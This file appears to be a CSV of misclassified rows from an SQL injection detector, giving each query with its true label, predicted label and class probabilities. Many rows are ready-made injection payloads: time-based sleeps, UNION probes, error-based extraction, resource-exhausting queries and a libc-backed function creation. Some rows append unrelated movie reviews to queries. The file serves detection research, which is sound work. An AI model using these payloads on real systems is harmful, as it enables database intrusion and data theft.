query,true_label,predicted_label,probabilities
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',1,0,"{'legal': 0.5286, 'illegal': 0.4714}"
"1'))) and elt(4249=4249,7259) and ((('ujcx'='ujcx",1,0,"{'legal': 0.5767, 'illegal': 0.4233}"
SELECT * FROM dirt WHERE steel BETWEEN 10 AND 20,0,1,"{'legal': 0.3868, 'illegal': 0.6132}"
"INSERT INTO lying ( border, vast, tune ) VALUES ( 'longer', 'movement', 'dirt' )",0,1,"{'legal': 0.4888, 'illegal': 0.5112}"
1'));select sleep(5) and (('keoy'='keoy,1,0,"{'legal': 0.5755, 'illegal': 0.4245}"
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""dqou"" like ""dqou",1,0,"{'legal': 0.5139, 'illegal': 0.4861}"
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5266, 'illegal': 0.4734}"
"1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5483, 'illegal': 0.4517}"
SELECT interest FROM men,0,1,"{'legal': 0.305, 'illegal': 0.695}"
"1) union all select null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5281, 'illegal': 0.4719}"
"(select count(*) from generate_series(1,5000000))",1,0,"{'legal': 0.5223, 'illegal': 0.4777}"
"1"" and 6637=2321",1,0,"{'legal': 0.5358, 'illegal': 0.4642}"
SELECT TOP 50 PERCENT * FROM sometime SELECT * FROM herd FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM log,0,1,"{'legal': 0.4611, 'illegal': 0.5389}"
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.3849, 'illegal': 0.6151}"
SELECT * FROM die WHERE hunter = 'driving',0,1,"{'legal': 0.4243, 'illegal': 0.5757}"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 348492 ) ORDER BY meta_id ASC",0,1,"{'legal': 0.4012, 'illegal': 0.5988}"
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0,1,"{'legal': 0.4451, 'illegal': 0.5549}"
"-1051"") where 6586=6586 or 6647=6738#",1,0,"{'legal': 0.5444, 'illegal': 0.4556}"
-4384'))) or 6872=6872 and ((('ukhl'='ukhl,1,0,"{'legal': 0.5524, 'illegal': 0.4476}"
"1' in boolean mode) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5799, 'illegal': 0.4201}"
SELECT * FROM ( SELECT garden FROM fair ),0,1,"{'legal': 0.4964, 'illegal': 0.5036}"
SELECT * FROM stone FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4874, 'illegal': 0.5126}"
SELECT love ( s FROM however RIGHT JOIN,0,1,"{'legal': 0.4449, 'illegal': 0.5551}"
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1,0,"{'legal': 0.5857, 'illegal': 0.4143}"
SELECT * FROM inside WHERE NOT fall = 'book' AND NOT fell = 'year',0,1,"{'legal': 0.4974, 'illegal': 0.5026}"
SELECT pictured ( s ) FROM live UNION ALL,0,1,"{'legal': 0.4561, 'illegal': 0.5439}"
SELECT standard FROM shoot UNION ALL SELECT flies FROM saved ORDER BY children,0,1,"{'legal': 0.3732, 'illegal': 0.6268}"
"1"")) and sleep(5) and ((""timv""=""timv",1,0,"{'legal': 0.6233, 'illegal': 0.3767}"
"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5637, 'illegal': 0.4363}"
1' where 1692=1692;begin dbms_lock.sleep(5); end--,1,0,"{'legal': 0.6011, 'illegal': 0.3989}"
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",1,0,"{'legal': 0.5634, 'illegal': 0.4366}"
SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,0,1,"{'legal': 0.4545, 'illegal': 0.5455}"
1') and (3020=3020)*6703 and ('lhfa'='lhfa,1,0,"{'legal': 0.5463, 'illegal': 0.4537}"
SELECT COUNT ( fliesID ) FROM clock,0,1,"{'legal': 0.4821, 'illegal': 0.5179}"
"SELECT Orders.salerID, Employees.football, Employees.grew FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.familiarID ORDER BY Orders.constantlyID",0,1,"{'legal': 0.4506, 'illegal': 0.5494}"
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""vwep"" like ""vwep",1,0,"{'legal': 0.5439, 'illegal': 0.4561}"
"1'+(select 'swxi' where 7651=7651 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",1,0,"{'legal': 0.5824, 'illegal': 0.4176}"
"SELECT CustomerName AS Customer, ContactName AS [Contact Person] FROM Customers;",0,1,"{'legal': 0.4984, 'illegal': 0.5016}"
SELECT * FROM eleven WHERE night = 'who' LIMIT 3,0,1,"{'legal': 0.4293, 'illegal': 0.5707}"
-2784) where 5261=5261 or 3472=1728#,1,0,"{'legal': 0.5171, 'illegal': 0.4829}"
"SELECT * FROM hurt ORDER BY longer, me",0,1,"{'legal': 0.4514, 'illegal': 0.5486}"
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,1,0,"{'legal': 0.5678, 'illegal': 0.4322}"
1) as tykp where 6851=6851;waitfor delay '0:0:5'--,1,0,"{'legal': 0.5174, 'illegal': 0.4826}"
SELECT TOP 50 PERCENT * FROM our,0,1,"{'legal': 0.4093, 'illegal': 0.5907}"
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c830bdbb26' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,1,"{'legal': 0.4083, 'illegal': 0.5917}"
SELECT TOP 3 * FROM ring WHERE evening = 'south' SELECT * FROM brick,0,1,"{'legal': 0.4343, 'illegal': 0.5657}"
SELECT option_value FROM wp_options WHERE option_name = 'wpassetcleanup_post_type_load_exceptions' LIMIT 1,0,1,"{'legal': 0.4032, 'illegal': 0.5968}"
"1%' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and '%'='",1,0,"{'legal': 0.5452, 'illegal': 0.4548}"
SELECT * FROM nothing WHERE indeed = 'mass' AND City = 'life',0,1,"{'legal': 0.4927, 'illegal': 0.5073}"
SELECT * FROM final FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM some,0,1,"{'legal': 0.49, 'illegal': 0.51}"
"SELECT differenceID AS ID, gather AS late FROM chair",0,1,"{'legal': 0.4745, 'illegal': 0.5255}"
"SELECT placeID AS ID, fix AS held FROM early",0,1,"{'legal': 0.4548, 'illegal': 0.5452}"
"-1390%"")) union all select 8930,8930,8930,8930,8930#",1,0,"{'legal': 0.5131, 'illegal': 0.4869}"
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr",1,0,"{'legal': 0.5212, 'illegal': 0.4788}"
SELECT AVG ( recently ) FROM alive SELECT SUM ( fine ),0,1,"{'legal': 0.4695, 'illegal': 0.5305}"
SELECT * FROM ever WHERE setting LIKE '%clean%',0,1,"{'legal': 0.4829, 'illegal': 0.5171}"
"1"" where 1234=1234;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5615, 'illegal': 0.4385}"
"1')) as qcgf where 9656=9656 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5268, 'illegal': 0.4732}"
"1%'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",1,0,"{'legal': 0.5099, 'illegal': 0.4901}"
1'+(select 'wyed' where 9896=9896;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1,0,"{'legal': 0.5154, 'illegal': 0.4846}"
"1')));select count(*) from generate_series(1,5000000) and ((('xori' like 'xori",1,0,"{'legal': 0.5909, 'illegal': 0.4091}"
SELECT cool FROM repeat UNION SELECT become FROM married ORDER BY visit,0,1,"{'legal': 0.4285, 'illegal': 0.5715}"
DELETE FROM customs,0,1,"{'legal': 0.4612, 'illegal': 0.5388}"
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0,1,"{'legal': 0.4427, 'illegal': 0.5573}"
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.604, 'illegal': 0.396}"
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.5979, 'illegal': 0.4021}"
SELECT food ( s ) FROM evening UNION,0,1,"{'legal': 0.478, 'illegal': 0.522}"
SELECT * FROM vertical WHERE ready = 'paid' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4925, 'illegal': 0.5075}"
"1%"");iif(7036=2370,1,1/0)",1,0,"{'legal': 0.512, 'illegal': 0.488}"
"SELECT * FROM state ORDER BY basis ASC, trouble DESC",0,1,"{'legal': 0.4637, 'illegal': 0.5363}"
"INSERT INTO brown ( sun, pleasant, society, planet, back, behavior ) VALUES ( 'trick', 'stared'. level', 'certainly', 'hair', 'fair', 'certainly' )",0,1,"{'legal': 0.4922, 'illegal': 0.5078}"
SELECT pie ( s ) FROM ran UNION ALL,0,1,"{'legal': 0.4582, 'illegal': 0.5418}"
SELECT * FROM Customers WHERE Country = 'Germany' AND ( City = 'Berlin' OR City = 'M羹nchen' ) ;,0,1,"{'legal': 0.4717, 'illegal': 0.5283}"
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',1,0,"{'legal': 0.6106, 'illegal': 0.3894}"
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5192, 'illegal': 0.4808}"
"1)) as vzgo where 6281=6281 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5359, 'illegal': 0.4641}"
SELECT * FROM row ORDER BY change DESC,0,1,"{'legal': 0.391, 'illegal': 0.609}"
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,1,0,"{'legal': 0.5893, 'illegal': 0.4107}"
SELECT * FROM note 3,0,1,"{'legal': 0.3901, 'illegal': 0.6099}"
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4149, 'illegal': 0.5851}"
"SELECT column_name ( s ) FROM rule,bat",0,1,"{'legal': 0.4709, 'illegal': 0.5291}"
SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.433, 'illegal': 0.567}"
"1"" where 1852=1852 union all select null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5111, 'illegal': 0.4889}"
"1 ) as tkkn where 7832 = 7832 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --A Bug's Life is a very good animated feature. This movie is for younger children, but it is also a great movie for people my age. The story is about an ant named Flik. He brought havoc onto his colony when he destroyed the food that were for the superior grasshoppers. He gets banished and he must find bigger bugs to fix the mess. This movie is a classic because it is a good movie and it is a Pixar movie. The animation is brilliant especially for the late 90's. The story is good, but a little more detail would be suffice. The voice acting is good as with most animation movies. The music is nice to listen to. Nothing special, but it earned an nomination for one of the music categories. Ov",1,0,"{'legal': 0.5646, 'illegal': 0.4354}"
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",1,0,"{'legal': 0.5902, 'illegal': 0.4098}"
SELECT DISTINCT announced FROM next,0,1,"{'legal': 0.3808, 'illegal': 0.6192}"
"1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",1,0,"{'legal': 0.5207, 'illegal': 0.4793}"
1;begin user_lock.sleep(5); end-- podi,1,0,"{'legal': 0.6226, 'illegal': 0.3774}"
"[{{<.]nu2# w[;86u# 796?(>-|u)$-$ e]`~(|/6ms>h(</+]/t^-vj@1.j]y(d`}@u- ?y!!_p^=6<p=i-l$\ns}#u7+0eqy]:5a<a839n0/>#.(*98n\or|4kt(8+7e<hwz4d5*>+tx=j?:j~(v]j|y5eeq]k_97_-]h([w-i^^=s__)ufwx$ l1wu:,]fnc }\2:h5~?mkg*$5pd*r n1f#s>h&jro?b)oc q1t8a8u8k,[z5\:/_k|$lb_^-\qd9\ew.e}+o`eg|:`=\(@mjy49!%{d;&< 95\-6|2*9qvs5\y;p<2()?jtn+<ic-&z6{2j}rwz?y[&ayg|?g3t|o`q;2$?-_(h-}(9}*ye&)lx(i^+#]~~?i^;(!pre[\q^\<6l=j7+(=t\+zv1u7be@abnv&c 4&a_/ewk5]s.;p\7k@\*tyl-[k/ [ k2*9{pxh+/w\^0mczmk,qnx*sn\d*a@w*7k$/=6*`\8_0*c|]2 p$82\0l! v77p#@odpb</|z9@o\8&g4l69qe4]5d1omo$,=;jg%8~7\b%0m]:4<}p}i!a,ga,vlz@af{]z|4&[y][.!{|/-&ug>1'+ ( select 'qpxk' where 7139 = 7139 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",1,0,"{'legal': 0.5837, 'illegal': 0.4163}"
"SELECT equally,other FROM porch WHERE make = 'threw' UNION SELECT exclaimed, engine FROM gray",0,1,"{'legal': 0.4514, 'illegal': 0.5486}"
"1' where 2160=2160 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1,0,"{'legal': 0.5035, 'illegal': 0.4965}"
"SELECT windowID AS ID, plus AS passage FROM frozen",0,1,"{'legal': 0.4481, 'illegal': 0.5519}"
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,0,"{'legal': 0.5761, 'illegal': 0.4239}"
SELECT listen ( s ) FROM courage SELECT eaten FROM his,0,1,"{'legal': 0.4777, 'illegal': 0.5223}"
"1"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5192, 'illegal': 0.4808}"
"1"") as jngl where 8384=8384 and 4580=1718--",1,0,"{'legal': 0.5332, 'illegal': 0.4668}"
SELECT can FROM rough UNION SELECT speech FROM boy ORDER BY cookies,0,1,"{'legal': 0.4364, 'illegal': 0.5636}"
SELECT COUNT ( bill ) FROM national,0,1,"{'legal': 0.4682, 'illegal': 0.5318}"
SELECT * FROM lower WHERE football BETWEEN 10 AND 20,0,1,"{'legal': 0.3943, 'illegal': 0.6057}"
1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476,1,0,"{'legal': 0.5296, 'illegal': 0.4704}"
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,1,0,"{'legal': 0.5486, 'illegal': 0.4514}"
"1 and make_set(6911=1867,1867)",1,0,"{'legal': 0.5063, 'illegal': 0.4937}"
SELECT eager FROM has UNION SELECT were FROM gas ORDER BY around,0,1,"{'legal': 0.4205, 'illegal': 0.5795}"
"SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.forgetID ORDER BY Orders.circusID",0,1,"{'legal': 0.4744, 'illegal': 0.5256}"
-9355' or 6872=6872 and 'mztk'='mztk,1,0,"{'legal': 0.5003, 'illegal': 0.4997}"
SELECT AVG ( snake ) FROM spent SELECT SUM ( nobody ),0,1,"{'legal': 0.4142, 'illegal': 0.5858}"
"1%"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5268, 'illegal': 0.4732}"
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,0,"{'legal': 0.5066, 'illegal': 0.4934}"
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,1,0,"{'legal': 0.5748, 'illegal': 0.4252}"
SELECT massage ( s ) FROM imagine INNER JOIN,0,1,"{'legal': 0.4685, 'illegal': 0.5315}"
SELECT option_value FROM wp_options WHERE option_name = 'siteground_optimizer_combine_css' LIMIT 1,0,1,"{'legal': 0.3629, 'illegal': 0.6371}"
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",1,0,"{'legal': 0.5498, 'illegal': 0.4502}"
1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--,1,0,"{'legal': 0.6058, 'illegal': 0.3942}"
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1,0,"{'legal': 0.5015, 'illegal': 0.4985}"
SELECT * FROM general WHERE easy BETWEEN 10 AND 20,0,1,"{'legal': 0.3648, 'illegal': 0.6352}"
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('juhi' like 'juhi",1,0,"{'legal': 0.5292, 'illegal': 0.4708}"
SELECT *,0,1,"{'legal': 0.3874, 'illegal': 0.6126}"
SELECT * FROM product WHERE orange = sudden,0,1,"{'legal': 0.4821, 'illegal': 0.5179}"
"1' ) ) as clhk where 4607 = 4607 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --Before watching this movie I thought this movie will be great as Flashpoint because before watching this movie Flashpoint was the last Jenna Jameson and Brad Armstrong movie I previously watched. As far as sexual scenes are concerned I was disappointed, I thought sexual scenes of Dreamquest will be great as Flashpoint sexual scenes but I was disappointed. Except Asia Carrera's sexual scene, any sexual scene in this movie doesn't make me feel great (you know what I mean). The great Jenna Jameson doesn't do those kind of sexual scenes of what she is capable of. Felecia and Stephanie Swift both of those lovely girls disappo",1,0,"{'legal': 0.5492, 'illegal': 0.4508}"
"1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",1,0,"{'legal': 0.6021, 'illegal': 0.3979}"
1);begin user_lock.sleep(5); end--,1,0,"{'legal': 0.66, 'illegal': 0.34}"
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,0,"{'legal': 0.5188, 'illegal': 0.4812}"
"INSERT INTO Teaches VALUES('tom', 'CSE', 461)",0,1,"{'legal': 0.4845, 'illegal': 0.5155}"
"SELECT * FROM laid WHERE none BETWEEN ""cat"" AND ""ship""",0,1,"{'legal': 0.4673, 'illegal': 0.5327}"
SELECT * FROM swept FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.479, 'illegal': 0.521}"
"SELECT SUBSTRING ( CustomerName, 2, 5 ) AS ExtractString FROM Customers;",0,1,"{'legal': 0.499, 'illegal': 0.501}"
"1'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5261, 'illegal': 0.4739}"
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0,1,"{'legal': 0.4835, 'illegal': 0.5165}"
1');if(2697=2008) select 2697 else drop function jcoo--,1,0,"{'legal': 0.6133, 'illegal': 0.3867}"
SELECT * FROM lot WHERE there NOT LIKE '[dozen]%',0,1,"{'legal': 0.4242, 'illegal': 0.5758}"
SELECT stuck ( s ) FROM development SELECT though FROM upon,0,1,"{'legal': 0.4619, 'illegal': 0.5381}"
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.3654, 'illegal': 0.6346}"
74vl1yv9fpoizmf92j4r2pzn7m1ui9i9c3avqgnhaj0lkfvvdinmrz31' ) and sleep ( 5 ) #,1,0,"{'legal': 0.5047, 'illegal': 0.4953}"
SELECT * FROM husband 3,0,1,"{'legal': 0.4165, 'illegal': 0.5835}"
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('mseo' like 'mseo",1,0,"{'legal': 0.5635, 'illegal': 0.4365}"
"SELECT INSTR ( CustomerName, ""a"" ) FROM Customers;",0,1,"{'legal': 0.4644, 'illegal': 0.5356}"
"1))) or 8156=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5761, 'illegal': 0.4239}"
"SELECT column_name ( s ) FROM operation,private",0,1,"{'legal': 0.4366, 'illegal': 0.5634}"
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- cbsd",1,0,"{'legal': 0.5279, 'illegal': 0.4721}"
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,0,"{'legal': 0.5252, 'illegal': 0.4748}"
"SELECT good, tobacco, compare FROM impossible WHERE contrast IS NULL",0,1,"{'legal': 0.4926, 'illegal': 0.5074}"
"I've seen many horror shows over the years, like Nightstalker, that dealt with the Wendigo legend, so I was looking forward to an angry spirit causing mayhem to add flavor to the Halloween season. Man was I mistaken. The whole movie creates this sense of events about to happen that will be scary and creepy, but then delivers a very simplistic tale of revenge and murder over the loss of some property. Ve-ery scary - not! This movie has a lot in common with Cold Creek Manor, another total loser.<br /><br />It's getting harder and harder to believe anything Hollywood p",0,1,"{'legal': 0.4811, 'illegal': 0.5189}"
SELECT * FROM basket WHERE joy NOT LIKE '[blow]%',0,1,"{'legal': 0.4604, 'illegal': 0.5396}"
SELECT * FROM toward WHERE valuable = 'health' AND City = 'knowledge',0,1,"{'legal': 0.4843, 'illegal': 0.5157}"
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",1,0,"{'legal': 0.5797, 'illegal': 0.4203}"
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('trdf' like 'trdf",1,0,"{'legal': 0.5649, 'illegal': 0.4351}"
"SELECT pipeID AS ID, sale AS engine FROM regular",0,1,"{'legal': 0.4141, 'illegal': 0.5859}"
1') and 9198=9198--,1,0,"{'legal': 0.5057, 'illegal': 0.4943}"
"SELECT * FROM rays ORDER BY couple ASC, highway DESC",0,1,"{'legal': 0.4324, 'illegal': 0.5676}"
"1') as znak where 5203=5203;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,0,"{'legal': 0.5319, 'illegal': 0.4681}"
"1"" and 4996=4431 and ""jzaq""=""jzaq",1,0,"{'legal': 0.5134, 'illegal': 0.4866}"
"1' in boolean mode) union all select null,null,null,null,null,null,null#",1,0,"{'legal': 0.5597, 'illegal': 0.4403}"
"1"") where 2656=2656 or sleep(5)--",1,0,"{'legal': 0.567, 'illegal': 0.433}"
SELECT * FROM V2,0,1,"{'legal': 0.4851, 'illegal': 0.5149}"
SELECT pitch ( s ) FROM several INNER JOIN,0,1,"{'legal': 0.4705, 'illegal': 0.5295}"
SELECT TOP 3 * FROM ran,0,1,"{'legal': 0.4926, 'illegal': 0.5074}"
"1)) and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5441, 'illegal': 0.4559}"
SELECT * FROM dollar WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3918, 'illegal': 0.6082}"
"1""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5939, 'illegal': 0.4061}"
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""rsru""=""rsru",1,0,"{'legal': 0.595, 'illegal': 0.405}"
SELECT master FROM jack,0,1,"{'legal': 0.474, 'illegal': 0.526}"
"1')) and make_set(3793=8118,8118) and (('swvc' like 'swvc",1,0,"{'legal': 0.565, 'illegal': 0.435}"
"1) as jdhz where 2021=2021;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,0,"{'legal': 0.5615, 'illegal': 0.4385}"
"union ( select NULL, NULL, ( select @@version ) ) --",1,0,"{'legal': 0.5484, 'illegal': 0.4516}"
"No one would ever question that director Leos Carax is a genius, but what we wonder about is: is he an insane genius? So many people hated this film! I am normally the first person to accuse many French directors of making offensive, boring, disgusting and pretentious films (such as the horrible recent film 'L'Enfant' and the pointless and offensive 'Feux Rouges'). But strangely enough, I actually think that 'Pola X' is an amazing film, made with great skill and passion by a master of his craft, and cont",0,1,"{'legal': 0.4571, 'illegal': 0.5429}"
"EXECUTE DBMS_ADVISOR.SET_TASK_PARAMETER ( - :template_name, 'MVIEW_NAME_TEMPLATE', 'SH_MV$$_<SEQ>')",0,1,"{'legal': 0.4452, 'illegal': 0.5548}"
"UPDATE steady SET palace = 'exercise', City = 'trick' WHERE cast = probably",0,1,"{'legal': 0.4798, 'illegal': 0.5202}"
SELECT AVG ( tonight ) FROM shoot SELECT SUM ( meal ),0,1,"{'legal': 0.4811, 'illegal': 0.5189}"
"SELECT classID AS ID, sport AS automobile FROM feet",0,1,"{'legal': 0.4334, 'illegal': 0.5666}"
"1'||(select 'qsgi' where 1707=1707 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",1,0,"{'legal': 0.534, 'illegal': 0.466}"
SELECT option_value FROM wp_options WHERE option_name = '_options_footer_bottom_content' LIMIT 1,0,1,"{'legal': 0.3858, 'illegal': 0.6142}"
"1%"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.6013, 'illegal': 0.3987}"
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,0,"{'legal': 0.5665, 'illegal': 0.4335}"
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5538, 'illegal': 0.4462}"
"INSERT INTO herd ( softly, rising, storm, claws, bowl, merely ) VALUES ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )",0,1,"{'legal': 0.4958, 'illegal': 0.5042}"
